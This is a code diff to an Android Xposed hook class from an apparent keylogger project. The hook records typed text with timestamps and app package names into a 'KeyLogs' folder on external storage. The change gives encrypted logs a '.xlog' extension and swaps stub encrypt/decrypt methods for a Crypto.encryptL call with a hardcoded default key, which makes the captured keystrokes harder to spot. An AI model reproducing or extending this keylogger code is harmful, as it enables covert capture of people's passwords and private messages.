@@ -103,12 +103,16 @@ public class Hook implements IXposedHookZygoteInit {
 		//Creating the writer if it is null(putting it into the ZygoteInit method doesn't work)
 		if (mWriter == null)
 			try {
+				String ext = ".log";
+				if(mXsp.getBoolean(mEncrypt, false)){
+					ext = ".xlog";
+				}
 				if(!mXsp.getBoolean(mUseDate, true))
-					filePath = Environment.getExternalStorageDirectory() +  mXsp.getString(mLogPath, "KeyLogs/logs.log");
+					filePath = Environment.getExternalStorageDirectory() +  mXsp.getString(mLogPath, "KeyLogs/logs" + ext);
 				else{
 					filePath = Environment.getExternalStorageDirectory() + mXsp.getString(mLogPath, "KeyLogs") +
 							"/20" + currentDateTimeString.substring(6,7) + "/" +
-							currentDateTimeString.substring(3,4) + "/" + currentDateTimeString.substring(0,1) + ".log" ;
+							currentDateTimeString.substring(3,4) + "/" + currentDateTimeString.substring(0,1) + ext ;
 				}
 				mWriter = new BufferedWriter(new FileWriter(filePath, true));
 
@@ -118,7 +122,7 @@ public class Hook implements IXposedHookZygoteInit {
 
 		String logLine = currentDateTimeString + ">" + packageName + ">" + text;
 		if(mXsp.getBoolean(mEncrypt, false)){
-			logLine = encrypt(logLine, mXsp.getString(mEncryptKey, "6677667766776677"));
+			logLine = Crypto.encryptL(logLine, mXsp.getString(mEncryptKey, "6677667766776677"));
 		}
 		try {
 			//Write it
@@ -131,16 +135,5 @@ public class Hook implements IXposedHookZygoteInit {
 			//ignore
 		}
 	}
-	private String encrypt(String text, String key){
-		//encryption Logic.
 
-
-		return text;
-	}
-	public static String decrypt(String text, String key){
-		//decryption Logic
-
-
-		return text;
-	}
 }
